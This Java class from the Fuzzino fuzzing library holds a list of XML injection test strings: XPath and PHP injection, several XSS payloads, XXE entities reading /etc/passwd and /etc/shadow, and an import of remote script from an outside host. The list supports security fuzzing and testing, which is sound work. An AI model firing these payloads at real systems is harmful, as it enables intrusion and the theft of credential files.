//   Copyright 2012-2014 Fraunhofer FOKUS
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
package de.fraunhofer.fokus.fuzzing.fuzzino.heuristics.generators.string.data;

public class XMLInjections extends StringContainer {
	
	public static final XMLInjections INSTANCE = new XMLInjections();

	public XMLInjections() {
		super();
	}

	@Override
	protected void initValues() {
		//  the following values are taken from: https://wfuzz.googlecode.com/svn/trunk/wordlist/Injections/XML.txt
		add("count(/child::node())");
		add("x' or name()='username' or 'x'='y");
		add("<name>','')); phpinfo(); exit;/*</name>");
		add("<![CDATA[<script>var n=0;while(true){n++;}</script>]]>");
		add("<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>");
		add("<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>");
		add("<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><foo><![CDATA[' or 1=1 or ''=']]></foo>");
		add("<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file://c:/boot.ini\">]><foo>&xxe;</foo>");
		add("<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:////etc/passwd\">]><foo>&xxe;</foo>");
		add("<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:////etc/shadow\">]><foo>&xxe;</foo>");
		add("<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \file:////dev/random\">]><foo>&xxe;</foo>");
		add("<xml ID=I><X><C><![CDATA[<IMG SRC=\"javas]]><![CDATA[cript:alert('XSS');\">]]>");
		add("<xml ID=\"xss\"><I><B>&lt;IMG SRC=\"javas<!-- -->cript:alert('XSS')\"&gt;</B></I></xml><SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>");
		add("<xml SRC=\"xsstest.xml\" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>");
		add("<HTML xmlns:xss><?import namespace=\"xss\" implementation=\"http://ha.ckers.org/xss.htc\"><xss:xss>XSS</xss:xss></HTML>");
	}

}
